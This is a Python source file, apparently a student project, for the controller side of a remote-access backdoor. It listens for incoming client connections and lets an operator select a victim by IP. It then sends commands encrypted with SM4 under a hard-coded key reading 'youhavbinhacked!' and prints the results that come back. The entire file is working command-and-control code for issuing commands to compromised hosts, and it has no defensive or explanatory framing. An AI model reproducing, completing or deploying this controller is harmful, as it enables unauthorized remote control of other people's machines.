import subprocess
import socket
import threading
import os
from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT
####################################################
server_address=('localhost',6667)
connections=[]#socket,(ip,port),id
secret_key='youhavbinhacked!'.encode()#encode
crypt_sm4=CryptSM4()
####################################################
#SM4加密
def SM4_encrypt(plaintext,secret_key=secret_key,crypt_sm4=crypt_sm4):
    #encode
    plaintext=plaintext.encode()
    #加密
    crypt_sm4.set_key(secret_key, SM4_ENCRYPT)
    ciphertext = crypt_sm4.crypt_ecb(plaintext)
    #返回
    return ciphertext
def SM4_decrypt(ciphertext,secret_key=secret_key,crypt_sm4=crypt_sm4):
    #解密
    crypt_sm4.set_key(secret_key, SM4_DECRYPT)
    decrypted_text = crypt_sm4.crypt_ecb(ciphertext)
    #decode
    decrypted_text=decrypted_text.decode()
    #返回
    return decrypted_text
####################################################
#外部指令功能
def show_list():
    for i in connections:
        print(i)
def check_target(ip_dst,id_dst=0):
    for i in connections:
        ip_=i[1][0]
        id_=i[2]
        if ip_dst==ip_ and id_dst==id_:
            return i[0]
    return None
def show_help():
    print('/help\t显示帮助')
    print('/list\t显示所有可连接对象')
    print('/target<ip><id>\t从左到右搜索可用对象')
#删除连接
def delete_connection(socket_):
    for i in range(len(connections)):
        if connections[i][0]==socket_:
            connections.pop(i)
    socket_.close()
    return 0
####################################################
#内部指令功能(在客户端实现，服务端只负责发送)
def main_function(target_socket,ip_dst):
    while True:
        cmd=input(f'[server][{ip_dst}]')
        if cmd=='/exit':
            break
        cmd_encrypted=SM4_encrypt(cmd)
        target_socket.sendall(cmd_encrypted)
        data_recv=target_socket.recv(4096)
        data=SM4_decrypt(data_recv)
        print(data)
        if data=='[session_over]':
            break
    return 0
####################################################
#第一步，创建服务器
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 6667)
server_socket.bind(server_address)
server_socket.listen(100)
#第二步，等待连接的线程
def store_connections():
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"收到来自 {client_address[0]}:{client_address[1]} 的连接")
        obj=[client_socket, client_address,0]
        if obj in connections:
            obj[2]+=1
        connections.append(obj)
        #client_address=(ip,port)
#第三部，提供服务
def server_service():
    while True:
        main_cmd=input('[server]')#输入命令
        #采用双状态设计，先选定ip，然后才能定制操作
        #/help /list /target
        if main_cmd=='/help':
            show_help()
        elif main_cmd=='/list':
            show_list()
        elif main_cmd[:7]=='/target':
            temp=main_cmd.split()
            try:
                ip_dst=temp[1]
            except:
                print('[server]invalid command: no ip')
                continue
            try:
                id_dst=temp[2]
            except:
                id_dst=0
            #
            target_socket=check_target(ip_dst,id_dst)#查找socket
            if target_socket==None:
                print('[server]error:target do not exist')
                continue
            try:
                rtn=main_function(target_socket,ip_dst)#连接
            except:
                delete_connection(target_socket)#断开
                print('[server]disconnected')
            continue
        else:
            print('[server]error:no such instruction')
####################################################
#测试区
thread1 = threading.Thread(target=store_connections)
thread2 = threading.Thread(target=server_service)
thread1.start()
thread2.start()
